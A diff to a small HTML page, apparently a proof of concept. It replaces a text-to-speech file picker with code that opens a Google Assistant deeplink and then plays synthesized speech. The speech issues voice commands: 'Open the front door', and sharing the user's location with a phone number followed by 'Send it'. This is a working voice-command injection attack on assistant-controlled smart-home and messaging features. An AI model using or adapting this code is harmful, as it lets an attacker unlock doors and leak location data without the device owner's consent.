@@ -1,170 +1,40 @@
-<!DOCTYPE html>
-<html>
-<head>
-
-<title>TTS + File Picker + Redirect</title>
-
-<meta name="viewport" content="width=device-width, initial-scale=1">
-
-<style>
-
-body{
-background:#202124;
-color:white;
-font-family:Arial;
-text-align:center;
-padding:40px;
-}
-
-button{
-background:#4285F4;
-color:white;
-border:0;
-padding:18px 30px;
-border-radius:10px;
-font-size:20px;
-}
-
-</style>
-
-</head>
-
-<body>
-
-
-<h2>🔊 TTS File Picker Redirect</h2>
-
-
-<button onclick="mulai()">
-▶ MULAI
-</button>
-
-
-<input 
-id="filePicker"
-type="file"
-hidden
-accept="audio/*,.txt,.pdf"
-/>
-
-
-<p id="status">
-Siap...
-</p>
-
-
+<h1>
+    <a onclick="opendoor()" href="googleapp://deeplink/?data=CkwBDb3mGzBFAiEAic8-0un3nRrMa_hkMUV9fj_zD09xhu9D6xTXEsFSRPICIEJlWlJRSqv3afrbX9J8BZa_h3sAfF8NSDFAlLSj10MUEjkKAggAEgIIbxoQEg4IBBIK6oqo9AQECAFAACIdChtodHRwOi8vYXNzaXN0YW50Lmdvb2dsZS5jb20">
+        open front door
+    </a>
+</h1>
 
 <script>
+function speak(text) {
+    const speech = new SpeechSynthesisUtterance(text);
 
+    speech.lang = "en-US";
+    speech.rate = 1;
+    speech.pitch = 1;
+    speech.volume = 1;
 
-let picker =
-document.getElementById("filePicker");
-
-
-function mulai(){
-
-
-let status =
-document.getElementById("status");
-
-
-// buka file picker
-
-picker.click();
-
-
-
-picker.onchange=function(){
-
-
-let file =
-picker.files[0];
-
-
-if(file){
-
-
-status.innerHTML =
-"File dipilih: "+file.name;
-
-
-
-jalankanTTS();
-
-
+    window.speechSynthesis.speak(speech);
 }
 
+function share() {
+    setTimeout(() => {
+        speak("Share my location with");
 
+        setTimeout(() => {
+            speak("zero eight one two three four five six seven eight nine");
 
-};
+            setTimeout(() => {
+                speak("Send it");
+            }, 12000);
 
+        }, 6000);
 
+    }, 500);
 }
 
-
-
-function jalankanTTS(){
-
-
-let suara =
-new SpeechSynthesisUtterance(
-"File berhasil dipilih. Membuka Google sekarang."
-);
-
-
-suara.lang="id-ID";
-
-suara.rate=1;
-
-suara.pitch=1;
-
-suara.volume=1;
-
-
-
-suara.onstart=function(){
-
-document.getElementById("status").innerHTML =
-"🔊 Bicara...";
-
-};
-
-
-
-suara.onend=function(){
-
-
-document.getElementById("status").innerHTML =
-"🌐 Redirect...";
-
-
-
-setTimeout(function(){
-
-
-window.location.href =
-"https://www.google.com";
-
-
-},1000);
-
-
-
-};
-
-
-
-speechSynthesis.cancel();
-
-speechSynthesis.speak(suara);
-
-
-
+function opendoor() {
+    setTimeout(() => {
+        speak("Open the front door");
+    }, 500);
 }
-
-
 </script>
-
-
-</body>
-</html>
